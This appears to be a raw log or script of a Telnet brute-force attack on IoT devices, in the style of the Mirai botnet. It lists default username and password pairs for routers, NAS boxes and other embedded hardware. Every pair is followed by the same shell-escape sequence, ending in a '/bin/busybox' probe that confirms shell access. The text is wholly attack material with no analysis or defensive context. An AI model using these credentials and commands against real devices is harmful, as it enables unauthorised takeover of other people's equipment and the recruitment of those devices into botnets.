lp

enable
system
shell
sh
/bin/busybox eqdgjecx
administrator

admin
enable
system
shell
sh
/bin/busybox eqdgjecx
user

user
enable
system
shell
sh
/bin/busybox eqdgjecx
admin

cisco
enable
system
shell
sh
/bin/busybox eqdgjecx
super

debug
enable
system
shell
sh
/bin/busybox eqdgjecx
adm
enable
system
shell
sh
/bin/busybox eqdgjecx
admin

smcadmin
enable
system
shell
sh
/bin/busybox eqdgjecx
root

xc3511
enable
system
shell
sh
/bin/busybox eqdgjecx
user

debug
enable
system
shell
sh
/bin/busybox eqdgjecx
adtran
enable
system
shell
sh
/bin/busybox eqdgjecx
supervisor
enable
system
shell
sh
/bin/busybox eqdgjecx
root

toor
enable
system
shell
sh
/bin/busybox eqdgjecx
root

1234
enable
system
shell
sh
/bin/busybox eqdgjecx
root

nas4free
enable
system
shell
sh
/bin/busybox eqdgjecx
trans

trans
enable
system
shell
sh
/bin/busybox eqdgjecx
craft
enable
system
shell
sh
/bin/busybox eqdgjecx
nokia
enable
system
shell
sh
/bin/busybox eqdgjecx
manuf

xxyyzz
enable
system
shell
sh
/bin/busybox eqdgjecx
admin

admin1234
enable
system
shell
sh
/bin/busybox eqdgjecx
wank

wank
enable
system
shell
sh
/bin/busybox eqdgjecx
root

alien
enable
system
shell
sh
/bin/busybox eqdgjecx
system

manager
enable
system
shell
sh
/bin/busybox eqdgjecx
admin

bintec
enable
system
shell
sh
/bin/busybox eqdgjecx
toor
enable
system
shell
sh
/bin/busybox eqdgjecx
root

cat1029
enable
system
shell
sh
/bin/busybox eqdgjecx
hax0r
enable
system
shell
sh
/bin/busybox eqdgjecx
root

indigo
enable
system
shell
sh
/bin/busybox eqdgjecx
root

00000000
enable
system
shell
sh
/bin/busybox eqdgjecx
